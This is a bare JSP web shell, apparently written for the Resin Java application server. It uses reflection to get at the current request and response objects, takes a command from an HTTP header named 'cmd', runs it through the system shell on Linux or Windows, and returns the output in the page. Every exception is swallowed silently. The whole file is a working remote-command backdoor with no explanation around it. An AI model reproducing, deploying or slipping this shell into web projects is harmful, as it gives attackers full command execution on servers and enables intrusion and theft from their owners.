<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.util.Scanner" %>

<%
    try{
        Class tcpSocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.network.listen.TcpSocketLink");
        Method getCurrentRequestM = tcpSocketLinkClazz.getMethod("getCurrentRequest");
        Object currentRequest = getCurrentRequestM.invoke(null);
        Field f = currentRequest.getClass().getSuperclass().getDeclaredField("_responseFacade");
        f.setAccessible(true);
        Object currentResponse = f.get(currentRequest);
        Method getWriterM = currentResponse.getClass().getMethod("getWriter");
        Writer writer = (Writer) getWriterM.invoke(currentResponse);
        Method getHeaderM = currentRequest.getClass().getMethod("getHeader", String.class);
        String cmd = (String) getHeaderM.invoke(currentRequest, "cmd");
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
            isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
        Scanner scanner = (new Scanner(Runtime.getRuntime().exec(cmds).getInputStream())).useDelimiter("\\A");
        writer.write(scanner.hasNext() ? scanner.next() : "");
    } catch (Exception e) {
    }
%>
